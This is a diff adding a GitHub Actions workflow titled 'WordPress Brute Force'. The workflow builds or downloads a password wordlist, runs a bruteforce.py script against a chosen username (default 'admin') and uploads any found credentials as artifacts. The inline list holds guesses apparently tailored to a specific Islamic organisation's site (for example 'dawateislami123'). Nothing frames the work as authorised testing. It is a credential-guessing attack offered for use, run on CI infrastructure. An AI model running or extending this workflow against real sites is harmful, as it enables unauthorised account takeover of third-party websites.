@@ -1,0 +1,160 @@
+name: WordPress Brute Force
+
+on:
+  workflow_dispatch:
+    inputs:
+      wordlist:
+        description: 'Wordlist to use (top100, top1000, common)'
+        required: true
+        default: 'common'
+        type: choice
+        options:
+          - common
+          - top100
+          - top1000
+      username:
+        description: 'Target username'
+        required: false
+        default: 'admin'
+
+jobs:
+  bruteforce:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Set up Python
+        uses: actions/setup-python@v5
+        with:
+          python-version: '3.11'
+
+      - name: Install dependencies
+        run: pip install requests
+
+      - name: Prepare wordlist
+        run: |
+          if [ "${{ inputs.wordlist }}" = "common" ]; then
+            echo "Creating common passwords list..."
+            cat > wordlist.txt << 'EOF'
+          password
+          123456
+          12345678
+          qwerty
+          abc123
+          monkey
+          master
+          dragon
+          111111
+          baseball
+          iloveyou
+          trustno1
+          sunshine
+          letmein
+          welcome
+          shadow
+          superman
+          michael
+          football
+          password1
+          password123
+          admin
+          admin123
+          root
+          toor
+          pass
+          test
+          guest
+          master
+          changeme
+          default
+          dawat
+          dawateislami
+          islami
+          madina
+          muhammad
+          quran
+          deoband
+          Pakistan
+          pakistan123
+          dawateislami123
+          admin@123
+          Pass@123
+          Admin@123
+          Welcome1
+          Password1
+          P@ssw0rd
+          P@ssword1
+          Admin123!
+          admin123!
+          Passw0rd!
+          Summer2024
+          Winter2024
+          Spring2024
+          Fall2024
+          2024password
+          2025password
+          password2024
+          password2025
+          abcdefg
+          abcdefgh
+          abcdefghij
+          abcdefghijklm
+          qwerty123
+          qwertyuiop
+          zxcvbnm
+          123456789
+          1234567890
+          0987654321
+          1q2w3e4r
+          1qaz2wsx
+          qazwsx
+          zaq1xsw2
+          love
+          secret
+          princess
+          access
+          hello
+          charlie
+          donald
+          batman
+          matrix
+          Whatever1
+          whatever1
+          EOF
+          elif [ "${{ inputs.wordlist }}" = "top100" ]; then
+            echo "Downloading top 100 passwords..."
+            curl -sL "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/top-100.txt" -o wordlist.txt
+          elif [ "${{ inputs.wordlist }}" = "top1000" ]; then
+            echo "Downloading top 1000 passwords..."
+            curl -sL "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/top-1000.txt" -o wordlist.txt
+          fi
+          echo "Wordlist ready: $(wc -l < wordlist.txt) passwords"
+
+      - name: Run brute force
+        run: |
+          python3 bruteforce.py \
+            -w wordlist.txt \
+            -u ${{ inputs.username }} \
+            -o found.txt \
+            -b 50
+
+      - name: Display results
+        if: always()
+        run: |
+          if [ -f found.txt ]; then
+            echo "=== RESULTS ==="
+            cat found.txt
+          else
+            echo "No password found in this wordlist."
+          fi
+
+      - name: Upload results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: bruteforce-results-${{ inputs.wordlist }}
+          path: |
+            found.txt
+            wordlist.txt
+          retention-days: 7
